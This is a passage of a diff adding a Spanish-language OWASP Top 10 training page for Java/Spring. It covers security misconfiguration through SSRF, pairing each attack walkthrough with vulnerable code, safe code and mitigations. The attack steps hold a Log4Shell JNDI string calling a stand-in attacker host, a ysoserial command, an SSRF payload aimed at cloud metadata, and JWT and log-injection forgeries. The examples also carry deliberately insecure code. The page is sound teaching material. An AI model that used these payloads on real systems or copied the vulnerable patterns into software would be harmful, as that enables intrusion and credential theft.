+    attackSteps: "1. Atacante escanea con Shodan/nuclei buscando /actuator/env\n2. Encuentra app Spring Boot con actuator sin protección\n3. GET /actuator/env devuelve todas las env vars incluyendo DB_PASSWORD\n4. Accede directamente a la base de datos con esas credenciales\n5. Exfiltra toda la base de datos",
+    vulnCode: `// VULNERABLE - application.properties (Spring Boot)
+# Actuator expuesto sin autenticación
+management.endpoints.web.exposure.include=*
+management.endpoint.health.show-details=always
+
+# H2 console habilitada en producción
+spring.h2.console.enabled=true
+
+# Stack traces en respuestas de error
+server.error.include-stacktrace=always
+server.error.include-message=always
+
+# CORS demasiado permisivo
+@CrossOrigin(origins = "*", allowedHeaders = "*")
+
+// VULNERABLE - error handler que revela info
+@ExceptionHandler(Exception.class)
+public ResponseEntity<String> handleError(Exception e) {
+    return ResponseEntity.status(500).body(e.getMessage());
+    // Revela: tabla no existe, columna no encontrada, etc.
+}`,
+    safeCode: `// SEGURO - application.properties
+# Solo exponer health check en actuator
+management.endpoints.web.exposure.include=health,info
+management.endpoint.health.show-details=never
+# Asegurar actuator con Spring Security
+management.endpoints.web.base-path=/internal/actuator
+
+# H2 solo en perfil de desarrollo
+spring.h2.console.enabled=false  # default en prod
+
+# Errores genéricos sin información interna
+server.error.include-stacktrace=never
+server.error.include-message=never
+
+// SEGURO - CORS restrictivo
+@Configuration
+public class CorsConfig {
+    @Bean
+    public CorsConfigurationSource corsConfigurationSource() {
+        CorsConfiguration config = new CorsConfiguration();
+        config.setAllowedOrigins(List.of("https://miaplicacion.com"));
+        config.setAllowedMethods(List.of("GET", "POST", "PUT"));
+        config.setAllowedHeaders(List.of("Authorization", "Content-Type"));
+        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
+        source.registerCorsConfiguration("/api/**", config);
+        return source;
+    }
+}
+
+// SEGURO - error handler genérico
+@ExceptionHandler(Exception.class)
+public ResponseEntity<ErrorResponse> handleError(Exception e) {
+    log.error("Internal error", e); // log interno, no al cliente
+    return ResponseEntity.status(500)
+        .body(new ErrorResponse("ERR_INTERNAL", "Error interno del servidor"));
+}`,
+    mitigation: [
+      "Deshabilitar H2 console, Swagger y Actuator completo en producción",
+      "Proteger /actuator con Spring Security si se necesitan métricas",
+      "Configurar CORS con whitelist explícita, nunca '*' en producción",
+      "Añadir headers de seguridad: HSTS, CSP, X-Frame-Options (Spring Security los agrega)",
+      "Usar perfiles de Spring (prod vs dev) para separar configuraciones",
+      "Automatizar auditoría de configuración en CI/CD con OWASP ZAP o Trivy"
+    ],
+    risks: { exploitability: 80, prevalence: 88, detectability: 75, impact: 65 }
+  },
+  {
+    id: "A06",
+    title: "Vulnerable Components",
+    category: "Componentes",
+    severity: "high",
+    tags: ["Log4Shell", "CVE", "Maven", "Outdated Libraries", "Supply Chain"],
+    description: "Uso de librerías, frameworks y dependencias con vulnerabilidades conocidas (CVEs). Incluye el devastador Log4Shell.",
+    fullDesc: "Log4Shell (CVE-2021-44228) afectó a prácticamente toda la industria Java: una sola línea en un campo de log permitía ejecución remota de código en millones de servidores. La causa: Log4j como dependencia transitiva sin monitorear. El problema no es solo actualizar: es saber qué tenés instalado.",
+    realCase: "Log4Shell (2021): Afectó a Apple, Amazon, Microsoft, Tesla, Twitter y miles de empresas. CVSS 10.0 (máximo). Solo escribir una cadena especial en cualquier campo logueado ejecutaba código arbitrario. Spring4Shell (2022): RCE en Spring Framework afectó millones de apps Java. Struts2 (2017, Equifax): CVE-2017-5638, RCE, 147M de registros comprometidos.",
+    attackSteps: "1. Atacante identifica que la app usa Log4j 2.14 (vulnerable)\n2. Envía request con header: X-Api-Version: ${jndi:ldap://atacante.com/x}\n3. Log4j evalúa la expresión JNDI al loguear el header\n4. El servidor hace lookup LDAP al servidor del atacante\n5. El servidor responde con clase Java maliciosa → RCE instantáneo",
+    vulnCode: `// VULNERABLE - pom.xml con versiones desactualizadas
+<dependencies>
+    <!-- Log4Shell: CVSS 10.0 -->
+    <dependency>
+        <groupId>org.apache.logging.log4j</groupId>
+        <artifactId>log4j-core</artifactId>
+        <version>2.14.0</version>  <!-- VULNERABLE -->
+    </dependency>
+
+    <!-- Spring4Shell -->
+    <dependency>
+        <groupId>org.springframework</groupId>
+        <artifactId>spring-webmvc</artifactId>
+        <version>5.3.17</version>  <!-- VULNERABLE -->
+    </dependency>
+
+    <!-- Jackson deserialization RCE -->
+    <dependency>
+        <groupId>com.fasterxml.jackson.core</groupId>
+        <artifactId>jackson-databind</artifactId>
+        <version>2.9.8</version>  <!-- VULNERABLE: CVE-2019-14439 -->
+    </dependency>
+</dependencies>`,
+    safeCode: `// SEGURO - pom.xml con versiones actualizadas y auditoría
+<dependencies>
+    <dependency>
+        <groupId>org.apache.logging.log4j</groupId>
+        <artifactId>log4j-core</artifactId>
+        <version>2.23.1</version>  <!-- Parcheado -->
+    </dependency>
+</dependencies>
+
+<!-- Plugin para detectar CVEs automáticamente en build -->
+<plugin>
+    <groupId>org.owasp</groupId>
+    <artifactId>dependency-check-maven</artifactId>
+    <version>9.0.9</version>
+    <configuration>
+        <failBuildOnCVSS>7</failBuildOnCVSS> <!-- Falla si CVSS >= 7 -->
+    </configuration>
+    <executions>
+        <execution>
+            <goals><goal>check</goal></goals>
+        </execution>
+    </executions>
+</plugin>
+
+// Comando para auditar manualmente:
+// mvn dependency-check:check
+// mvn versions:display-dependency-updates
+
+// También usar GitHub Dependabot o Snyk en CI/CD`,
+    mitigation: [
+      "Integrar OWASP Dependency-Check plugin en Maven/Gradle (falla build si CVSS >= 7)",
+      "Usar GitHub Dependabot o Snyk para alertas automáticas de CVEs",
+      "Mantener un SBOM (Software Bill of Materials) actualizado",
+      "Monitorear NVD (nvd.nist.gov) y CVE Details para tus dependencias clave",
+      "Actualizar dependencias en cada sprint, no solo cuando hay vulnerabilidad crítica",
+      "Evitar dependencias sin mantenimiento activo (sin commits en 2+ años)"
+    ],
+    risks: { exploitability: 65, prevalence: 85, detectability: 45, impact: 80 }
+  },
+  {
+    id: "A07",
+    title: "Auth & Session Failures",
+    category: "Autenticación",
+    severity: "critical",
+    tags: ["Brute Force", "JWT", "Session Hijacking", "Credential Stuffing", "MFA"],
+    description: "Fallas en autenticación y sesiones que permiten comprometer cuentas, secuestrar sesiones o asumir identidades ajenas.",
+    fullDesc: "Incluye: fuerza bruta sin límite de intentos, credential stuffing con contraseñas filtradas (HaveIBeenPwned), JWTs con algoritmo 'none' o clave débil, tokens de sesión predecibles o en URLs, y falta de invalidación de sesión en logout. Spring Security resuelve mucho de esto si se configura correctamente.",
+    realCase: "Rockstar Games (2022): Credential stuffing masivo con contraseñas filtradas de otras brechas. Dunkin Donuts (2019): 300.000 cuentas comprometidas por credential stuffing. Caso JWT 'none': CVE-2015-9235 afectó múltiples librerías JWT que aceptaban alg:none, permitiendo falsificar tokens sin firma. GitHub (2013): Tokens de sesión en URLs indexados por Google.",
+    attackSteps: "1. Atacante descarga lista de emails/contraseñas de breach (HaveIBeenPwned)\n2. Escribe script: for (email, pass) in breach_list: login(email, pass)\n3. Prueba 100.000 combinaciones en minutos (credential stuffing)\n4. O modifica JWT: cambia alg a 'none', modifica role a 'admin', envía sin firma\n5. Si el servidor no verifica firma correctamente, acepta el token falsificado",
+    vulnCode: `// VULNERABLE - AuthService.java sin rate limiting
+public String login(String email, String password) {
+    User user = userRepo.findByEmail(email);
+    // Sin límite de intentos: fuerza bruta posible
+    if (user != null && passwordEncoder.matches(password, user.getHash())) {
+        return generateToken(user);
+    }
+    throw new AuthException("Credenciales inválidas");
+}
+
+// VULNERABLE - JWT con clave débil hardcodeada
+private String generateToken(User user) {
+    return Jwts.builder()
+        .setSubject(user.getEmail())
+        .claim("role", user.getRole())
+        .signWith(SignatureAlgorithm.HS256, "secret") // débil!
+        .compact();
+}
+
+// VULNERABLE - no invalida sesión en logout
+@PostMapping("/logout")
+public void logout() {
+    // No hace nada con el token → sigue siendo válido
+    // Token JWT sin blacklist: válido hasta expiración`,
+    safeCode: `// SEGURO - AuthService.java con rate limiting (Bucket4j)
+@Service
+public class AuthService {
+    private final Map<String, Bucket> buckets = new ConcurrentHashMap<>();
+
+    public String login(String email, String password, String ip) {
+        // Rate limit: 5 intentos por IP por minuto
+        Bucket bucket = buckets.computeIfAbsent(ip,
+            k -> Bucket.builder()
+                .addLimit(Bandwidth.simple(5, Duration.ofMinutes(1)))
+                .build());
+
+        if (!bucket.tryConsume(1)) {
+            throw new TooManyRequestsException("Demasiados intentos");
+        }
+
+        User user = userRepo.findByEmail(email)
+            .orElseThrow(() -> new AuthException("Credenciales inválidas"));
+
+        if (!passwordEncoder.matches(password, user.getPasswordHash())) {
+            auditLog.warn("LOGIN_FAIL email={} ip={}", email, ip);
+            throw new AuthException("Credenciales inválidas");
+        }
+
+        return jwtService.generateToken(user);
+    }
+}
+
+// SEGURO - JWT con clave desde vault/env y rotación
+@Service
+public class JwtService {
+    // Clave de 256 bits desde variable de entorno
+    @Value("\${JWT_SECRET}")
+    private String secret;
+
+    public String generateToken(User user) {
+        return Jwts.builder()
+            .setSubject(user.getEmail())
+            .claim("role", user.getRole())
+            .setIssuedAt(new Date())
+            .setExpiration(Date.from(Instant.now().plusSeconds(3600)))
+            .signWith(Keys.hmacShaKeyFor(secret.getBytes()), SignatureAlgorithm.HS256)
+            .compact();
+    }
+
+    // SEGURO - blacklist de tokens para logout real
+    public void invalidateToken(String token) {
+        tokenBlacklist.add(token); // Redis con TTL = tiempo de expiración del token
+    }
+}`,
+    mitigation: [
+      "Implementar rate limiting por IP/usuario con Bucket4j o Resilience4j",
+      "Usar Spring Security con BCrypt y configuración correcta de JWT",
+      "Verificar siempre la firma del JWT y rechazar alg:none explícitamente",
+      "Implementar blacklist de tokens en Redis para logout efectivo",
+      "Habilitar MFA para cuentas con privilegios elevados",
+      "Integrar con HaveIBeenPwned API para detectar contraseñas comprometidas"
+    ],
+    risks: { exploitability: 80, prevalence: 70, detectability: 65, impact: 88 }
+  },
+  {
+    id: "A08",
+    title: "Software & Data Integrity",
+    category: "Integridad",
+    severity: "high",
+    tags: ["Deserialization", "CI/CD", "Supply Chain", "SolarWinds", "RCE"],
+    description: "Fallas que comprometen la integridad del software o datos: deserialización insegura, pipelines CI/CD comprometidos, dependencias maliciosas.",
+    fullDesc: "La deserialización insegura en Java es especialmente peligrosa: ObjectInputStream puede ejecutar código arbitrario durante la deserialización de objetos maliciosos (gadget chains). El ataque a SolarWinds fue un caso real de pipeline CI/CD comprometido que afectó a 18.000 organizaciones incluyendo agencias del gobierno de EE.UU.",
+    realCase: "SolarWinds (2020): Atacantes comprometieron el pipeline de build e insertaron backdoor en actualizaciones legítimas firmadas. 18.000 organizaciones afectadas incluyendo Microsoft, FireEye y múltiples agencias del gobierno de EE.UU. Apache Commons Collections (2015): Gadget chain de deserialización que afectó a WebLogic, JBoss, WebSphere y Jenkins. XZ Utils (2024): Backdoor en librería de compresión que casi comprometía SSH en millones de sistemas Linux.",
+    attackSteps: "1. Atacante identifica endpoint que deserializa objetos Java\n2. Genera payload con ysoserial: java -jar ysoserial.jar CommonsCollections6 'calc.exe'\n3. Envía el payload serializado malicioso al endpoint\n4. El servidor deserializa → ejecuta la gadget chain → RCE\n5. Establece reverse shell: atacante controla el servidor completamente",
+    vulnCode: `// VULNERABLE - DeserializationService.java
+@PostMapping("/api/deserialize")
+public Object deserialize(@RequestBody byte[] data) {
+    try {
+        // ObjectInputStream ejecuta código durante readObject()
+        // Un payload malicioso puede ejecutar cualquier comando
+        ObjectInputStream ois = new ObjectInputStream(
+            new ByteArrayInputStream(data));
+        return ois.readObject();  // RCE si hay gadget chains en classpath
+    } catch (Exception e) {
+        return null;
+    }
+}
+
+// VULNERABLE - caché con serialización Java nativa
+// Si Redis guarda objetos Java serializados sin validación
+byte[] cached = redisTemplate.opsForValue().get("user:123");
+ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(cached));
+User user = (User) ois.readObject();  // un atacante que controle Redis = RCE`,
+    safeCode: `// SEGURO - Usar JSON en vez de serialización Java nativa
+@PostMapping("/api/data")
+public UserDto processData(@RequestBody UserDto dto) {
+    // Jackson deserializa solo al tipo esperado, sin gadget chains
+    return userService.process(dto);
+}
+
+// SEGURO - Si DEBES deserializar, usar filtros de validación (Java 9+)
+public Object safeDeserialize(byte[] data, Class<?> allowedType)
+    throws IOException, ClassNotFoundException {
+
+    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)) {
+        @Override
+        protected Class<?> resolveClass(ObjectStreamClass desc)
+                throws IOException, ClassNotFoundException {
+            // Whitelist estricta de clases permitidas
+            if (!desc.getName().startsWith("com.miapp.model.")) {
+                throw new InvalidClassException("Clase no permitida: " + desc.getName());
+            }
+            return super.resolveClass(desc);
+        }
+    };
+    return ois.readObject();
+}
+
+// SEGURO - CI/CD con verificación de integridad
+// En GitHub Actions:
+// - Usar SLSA para provenance de artifacts
+// - Firmar releases con Sigstore/cosign
+// - Verificar checksums de dependencias con lockfiles
+// - Usar Dependabot para PRs automáticos de actualizaciones`,
+    mitigation: [
+      "Evitar deserialización Java nativa: preferir JSON (Jackson) o Protocol Buffers",
+      "Si se usa ObjectInputStream, implementar filtros de clase whitelist (Java 9 serial filters)",
+      "Agregar OWASP Dependency-Check para detectar librerías con gadget chains conocidas",
+      "Firmar artefactos de build y verificar firmas en deploy (Sigstore, cosign)",
+      "Usar lockfiles (pom.xml con versiones exactas) y verificar checksums",
+      "Aislar deserialización en proceso separado con privilegios mínimos"
+    ],
+    risks: { exploitability: 65, prevalence: 60, detectability: 55, impact: 80 }
+  },
+  {
+    id: "A09",
+    title: "Security Logging Failures",
+    category: "Monitoreo",
+    severity: "medium",
+    tags: ["Logging", "SIEM", "Audit Trail", "Incident Response", "Log Injection"],
+    description: "Sin logging ni monitoreo adecuado los ataques pasan desapercibidos. El tiempo promedio de detección de una brecha es de 207 días (IBM 2023).",
+    fullDesc: "La falta de logging efectivo es crítica para detectar y responder a incidentes. Debe registrarse: intentos de autenticación fallidos, accesos a datos sensibles, cambios de permisos, excepciones de seguridad. Pero el logging también tiene su propia vulnerabilidad: Log Injection, donde un atacante puede falsificar entradas de log.",
+    realCase: "Target (2013): Los logs mostraban actividad sospechosa pero nadie los monitoreaba activamente. 40 millones de tarjetas comprometidas. El equipo de seguridad recibió alertas automáticas pero las ignoró. Uber (2016): Brecha de 57 millones de usuarios fue ocultada por 1 año porque nadie monitoreaba los accesos a S3. Marriott (2018): Atacantes estuvieron dentro del sistema 4 años sin ser detectados.",
+    attackSteps: "1. Atacante realiza 10.000 intentos de login fallidos\n2. Sin alertas configuradas, nadie lo detecta en tiempo real\n3. Eventualmente acierta con credential stuffing\n4. Accede durante semanas/meses: sin anomaly detection\n5. Exfiltra datos gradualmente para no disparar alertas de volumen\n* Log Injection: atacante ingresa 'admin\\n[2024] LOGIN_SUCCESS user=admin' para falsificar logs",
+    vulnCode: `// VULNERABLE - sin logging de eventos de seguridad
+public String login(String email, String password) {
+    User user = userRepo.findByEmail(email);
+    if (user != null && passwordEncoder.matches(password, user.getHash())) {
+        return generateToken(user);
+        // No se registra el login exitoso
+    }
+    // No se registra el intento fallido
+    throw new AuthException("Inválido");
+}
+
+// VULNERABLE - log injection
+public void logAction(String username, String action) {
+    // Si action contiene '\n', puede inyectar líneas falsas en el log
+    logger.info("User: {} performed: {}", username, action);
+    // Input malicioso: "view\n[INFO] User: admin performed: DELETE_ALL_USERS"
+}
+
+// VULNERABLE - datos sensibles en logs
+logger.debug("Processing payment for card: " + cardNumber);
+logger.info("User logged in with password: " + password);`,
+    safeCode: `// SEGURO - AuditService.java con logging estructurado
+@Service
+public class AuditService {
+    private static final Logger auditLog =
+        LoggerFactory.getLogger("AUDIT");
+
+    public void logAuthEvent(String email, String ip,
+                              boolean success, String reason) {
+        // Log estructurado (JSON) - fácil de indexar en SIEM
+        auditLog.info("{}",
+            Map.of(
+                "event", success ? "AUTH_SUCCESS" : "AUTH_FAIL",
+                "email", email,          // nunca loguear contraseñas
+                "ip", ip,
+                "timestamp", Instant.now().toString(),
+                "reason", reason != null ? reason : ""
+            ));
+    }
+}
+
+// SEGURO - AuthService con audit logging completo
+public String login(String email, String password, String ip) {
+    try {
+        User user = userRepo.findByEmail(email)
+            .orElseThrow(() -> new AuthException("no_user"));
+
+        if (!passwordEncoder.matches(password, user.getPasswordHash())) {
+            auditService.logAuthEvent(email, ip, false, "wrong_password");
+            throw new AuthException("Credenciales inválidas");
+        }
+
+        auditService.logAuthEvent(email, ip, true, null);
+        return jwtService.generateToken(user);
+
+    } catch (AuthException e) {
+        // Ya logueado arriba
+        throw e;
+    }
+}
+
+// SEGURO - sanitizar input antes de loguear (prevenir log injection)
+public void logUserAction(String username, String action) {
+    // Remover saltos de línea y caracteres de control
+    String safeAction = action.replaceAll("[\r\n\t]", "_");
+    String safeUser = username.replaceAll("[\r\n\t]", "_");
+    logger.info("action={} user={}", safeAction, safeUser);
+}`,
+    mitigation: [
+      "Loguear todos los eventos de autenticación (éxito y fallo) con IP y timestamp",
+      "Usar logging estructurado en JSON para facilitar indexación en SIEM (ELK, Splunk)",
+      "Configurar alertas automáticas: +5 fallos de login por minuto desde la misma IP",
+      "Sanitizar todos los inputs antes de loguear para prevenir Log Injection",
+      "Nunca loguear datos sensibles: contraseñas, tokens, números de tarjeta, PII",
+      "Centralizar logs en sistema externo (no en el mismo servidor) para evitar borrado"
+    ],
+    risks: { exploitability: 40, prevalence: 65, detectability: 30, impact: 70 }
+  },
+  {
+    id: "A10",
+    title: "Server-Side Request Forgery",
+    category: "SSRF",
+    severity: "high",
+    tags: ["SSRF", "Cloud Metadata", "AWS IMDSv1", "Internal Network", "Webhook"],
+    description: "SSRF fuerza al servidor a hacer peticiones a destinos no autorizados: servicios internos, metadata cloud, redes privadas.",
+    fullDesc: "SSRF es especialmente peligroso en entornos cloud: la URL de metadata de AWS/GCP (169.254.169.254) devuelve credenciales IAM temporales que permiten acceso completo a la cuenta cloud. El vector es cualquier funcionalidad donde el servidor hace peticiones HTTP basadas en input del usuario: webhooks, previews de URLs, importación de archivos, generación de PDFs.",
+    realCase: "Capital One (2019): SSRF via WAF misconfiguration → acceso a metadata AWS EC2 → credenciales IAM → 106 millones de registros en S3. Es el caso SSRF más famoso. GitLab (2021): SSRF en importación de proyectos permitió acceso a servicios internos. Shopify (2020): SSRF en webhooks exponía servicios internos. Microsoft Azure (2021): SSRF en servicio de traducción expuso credenciales.",
+    attackSteps: "1. App tiene función: POST /api/preview { url: 'https://...' }\n2. Atacante prueba: { url: 'http://169.254.169.254/latest/meta-data/' }\n3. Servidor hace el request internamente y devuelve la respuesta\n4. Atacante obtiene: /iam/security-credentials/EC2-Role\n5. Con las credenciales IAM accede a todo S3, DynamoDB, etc. de la cuenta AWS\n6. Variante: { url: 'http://localhost:8080/admin' } accede a servicios internos",
+    vulnCode: `// VULNERABLE - UrlPreviewService.java
+@PostMapping("/api/preview")
+public PreviewResponse getPreview(@RequestBody UrlRequest request) {
+    // Sin validación: acepta cualquier URL incluyendo IPs internas
+    String url = request.getUrl();
+    HttpClient client = HttpClient.newHttpClient();
+    HttpRequest httpRequest = HttpRequest.newBuilder()
+        .uri(URI.create(url))  // acepta http://169.254.169.254
+        .build();
+    HttpResponse<String> response = client.send(httpRequest,
+        HttpResponse.BodyHandlers.ofString());
+    return new PreviewResponse(response.body()); // devuelve credenciales IAM!
+}
+
+// VULNERABLE - generación de PDF con URL del usuario
+@PostMapping("/api/pdf")
+public byte[] generatePdf(@RequestParam String imageUrl) {
+    // El generador de PDF hace fetch de la imagen
+    // SSRF: imageUrl = http://internal-service:8080/admin/data`,
+    safeCode: `// SEGURO - UrlPreviewService.java con validación estricta
+@Service
+public class UrlPreviewService {
+
+    private static final List<String> ALLOWED_SCHEMES = List.of("https");
+    private static final List<String> BLOCKED_HOSTS = List.of(
+        "169.254.169.254",    // AWS metadata
+        "metadata.google.internal",  // GCP metadata
+        "localhost", "127.0.0.1", "::1",
+        "0.0.0.0", "10.", "172.16.", "192.168."
+    );
+
+    public PreviewResponse getPreview(String inputUrl) throws Exception {
+        URI uri = URI.create(inputUrl);
+
+        // 1. Solo HTTPS permitido
+        if (!ALLOWED_SCHEMES.contains(uri.getScheme())) {
+            throw new IllegalArgumentException("Solo HTTPS permitido");
+        }
+
+        // 2. Resolver IP y verificar que no es privada/metadata
+        InetAddress address = InetAddress.getByName(uri.getHost());
+        String resolvedIp = address.getHostAddress();
+
+        for (String blocked : BLOCKED_HOSTS) {
+            if (resolvedIp.startsWith(blocked) || uri.getHost().equals(blocked)) {
+                throw new SecurityException("Destino no permitido");
+            }
+        }
+
+        // 3. Verificar que es IP pública (no RFC 1918)
+        if (address.isSiteLocalAddress() || address.isLoopbackAddress()
+                || address.isLinkLocalAddress()) {
+            throw new SecurityException("IPs privadas no permitidas");
+        }
+
+        // 4. Timeout corto para evitar port scanning
+        HttpClient client = HttpClient.newBuilder()
+            .connectTimeout(Duration.ofSeconds(3))
+            .build();
+
+        HttpRequest request = HttpRequest.newBuilder()
+            .uri(uri)
+            .timeout(Duration.ofSeconds(5))
+            .build();
+
+        HttpResponse<String> response = client.send(request,
+            HttpResponse.BodyHandlers.ofString());
+
+        // 5. No devolver respuesta completa, solo metadata necesaria
+        return new PreviewResponse(extractTitle(response.body()));
+    }
+}`,
+    mitigation: [
+      "Validar URLs contra whitelist de dominios permitidos, no blacklist",
+      "Resolver el hostname a IP y verificar que no es privada (RFC 1918) ni metadata",
+      "Bloquear explícitamente 169.254.169.254 (AWS), metadata.google.internal (GCP)",
+      "En AWS: migrar a IMDSv2 que requiere token para acceder a metadata",
+      "Usar egress firewall para que el servidor solo pueda conectar a IPs autorizadas",
+      "Nunca devolver la respuesta completa del request interno al cliente"
+    ],
+    risks: { exploitability: 75, prevalence: 65, detectability: 60, impact: 85 }
+  }
+];
+
+// Render cards
+function renderCards(data) {
+  const grid = document.getElementById('vulnGrid');
+  grid.innerHTML = '';
+
+  let critical = 0, high = 0, medium = 0;
+
+  data.forEach((v, i) => {
+    if (v.severity === 'critical') critical++;
+    else if (v.severity === 'high') high++;
+    else if (v.severity === 'medium') medium++;
+
+    const card = document.createElement('div');
+    card.className = 'vuln-card';
+    card.dataset.severity = v.severity;
+    card.dataset.search = (v.title + v.category + v.tags.join(' ')).toLowerCase();
+    card.style.animationDelay = (i * 0.05) + 's';
+
+    const severityLabel = { critical: 'Crítica', high: 'Alta', medium: 'Media' }[v.severity];
+    const severityClass = `severity-${v.severity}`;
+    const realIndex = vulnerabilities.findIndex(x => x.id === v.id);
+
+    card.innerHTML = `
+      <div class="card-header">
+        <div class="card-number">OWASP ${v.id}:2021</div>
+        <div class="card-title-block">
+          <div class="card-title">${v.title}</div>
+          <div class="card-category">${v.category}</div>
+        </div>
+        <span class="severity-badge ${severityClass}">${severityLabel}</span>
+      </div>
+      <div class="card-body">
+        <p class="card-desc">${v.description}</p>
+        <div class="card-tags">${v.tags.map(t => `<span class="tag">${t}</span>`).join('')}</div>
+        <div class="card-footer">
+          <button class="btn-primary" onclick="openModal(${realIndex})">Ver detalles</button>
+        </div>
+      </div>
+    `;
+    grid.appendChild(card);
+  });
+
+  document.getElementById('stat-critical').textContent = critical;
+  document.getElementById('stat-high').textContent = high;
+  document.getElementById('stat-medium').textContent = medium;
+}
+
+// Filter by severity
+let currentSeverity = 'all';
+let currentSearch = '';
+
+function filterBySeverity(sev, btn) {
+  currentSeverity = sev;
+  document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+  btn.classList.add('active');
+  applyFilters();
+}
+
+function filterCards() {
+  currentSearch = document.getElementById('searchInput').value.toLowerCase();
+  applyFilters();
+}
+
+function applyFilters() {
+  const cards = document.querySelectorAll('.vuln-card');
+  cards.forEach(card => {
+    const matchSeverity = currentSeverity === 'all' || card.dataset.severity === currentSeverity;
+    const matchSearch = !currentSearch || card.dataset.search.includes(currentSearch);
+    card.classList.toggle('hidden', !(matchSeverity && matchSearch));
+  });
+}
+
+// Modal with tabs
+let activeTab = 'overview';
+
+function openModal(index) {
+  const v = vulnerabilities[index];
+  document.getElementById('modalNumber').textContent = `OWASP ${v.id}:2021`;
+  document.getElementById('modalTitle').textContent = v.title;
+  activeTab = 'overview';
+  renderModalContent(v);
+  document.getElementById('modalOverlay').classList.add('open');
+}
+
+function switchTab(tab, v) {
+  activeTab = tab;
+  document.querySelectorAll('.tab-btn').forEach(b => {
+    b.classList.toggle('active', b.dataset.tab === tab);
+  });
+  document.querySelectorAll('.tab-pane').forEach(p => {
+    p.classList.toggle('active', p.dataset.tab === tab);
+  });
+}
+
+function renderModalContent(v) {
+  const riskRows = [
+    { label: 'Explotabilidad', value: v.risks.exploitability, color: '#e05c6a' },
+    { label: 'Prevalencia',    value: v.risks.prevalence,    color: '#e0924a' },
+    { label: 'Detectabilidad', value: v.risks.detectability, color: '#d4b84a' },
+    { label: 'Impacto',        value: v.risks.impact,        color: '#4d9ef7' },
+  ];
+
+  document.getElementById('modalBody').innerHTML = `
+    <div class="tabs">
+      <button class="tab-btn active" data-tab="overview"   onclick="switchTab('overview',null)">Descripción</button>
+      <button class="tab-btn"        data-tab="attack"     onclick="switchTab('attack',null)">Cómo atacan</button>
+      <button class="tab-btn"        data-tab="code"       onclick="switchTab('code',null)">Código</button>
+      <button class="tab-btn"        data-tab="mitigation" onclick="switchTab('mitigation',null)">Mitigación</button>
+    </div>
+
+    <div class="tab-pane active" data-tab="overview">
+      <div class="modal-section">
+        <div class="modal-section-title">¿Qué es?</div>
+        <p class="modal-text">${v.fullDesc}</p>
+      </div>
+      <div class="modal-section">
+        <div class="modal-section-title">Métricas de Riesgo</div>
+        ${riskRows.map(r => `
+          <div class="risk-meter">
+            <div class="risk-meter-label"><span>${r.label}</span><span>${r.value}%</span></div>
+            <div class="risk-bar"><div class="risk-fill" style="width:${r.value}%;background:${r.color}"></div></div>
+          </div>
+        `).join('')}
+      </div>
+      <div class="modal-section">
+        <div class="modal-section-title">Caso Real</div>
+        <div class="real-case-box">${v.realCase}</div>
+      </div>
+    </div>
+
+    <div class="tab-pane" data-tab="attack">
+      <div class="modal-section">
+        <div class="modal-section-title">Pasos del Ataque</div>
+        <div class="attack-steps">${v.attackSteps.split('\n').map((s,i) => `<div class="attack-step"><span class="step-num">${i+1}</span><span>${s.replace(/^\d+\.\s*/,'')}</span></div>`).join('')}</div>
+      </div>
+    </div>
+
+    <div class="tab-pane" data-tab="code">
+      <div class="modal-section">
+        <div class="modal-section-title code-vuln-title">⚠ Código Vulnerable (Java)</div>
+        <div class="code-block vuln-code"><pre>${escHtml(v.vulnCode)}</pre></div>
+      </div>
+      <div class="modal-section">
+        <div class="modal-section-title code-safe-title">✓ Código Seguro (Java)</div>
+        <div class="code-block safe-code"><pre>${escHtml(v.safeCode)}</pre></div>
+      </div>
+    </div>
+
+    <div class="tab-pane" data-tab="mitigation">
+      <div class="modal-section">
+        <div class="modal-section-title">Cómo Mitigarlo</div>
+        <ul class="checklist">
+          ${v.mitigation.map(m => `<li>${m}</li>`).join('')}
+        </ul>
+      </div>
+      <div class="modal-section">
+        <div class="modal-section-title">Etiquetas</div>
+        <div class="card-tags">${v.tags.map(t => `<span class="tag">${t}</span>`).join('')}</div>
+      </div>
+    </div>
+  `;
+}
+
+function escHtml(str) {
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function closeModal() {
+  document.getElementById('modalOverlay').classList.remove('open');
+}
+
+function closeModalIfOutside(e) {
+  if (e.target === document.getElementById('modalOverlay')) closeModal();
+}
+
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
+
+renderCards(vulnerabilities);
+</script>
+</body>
+</html>
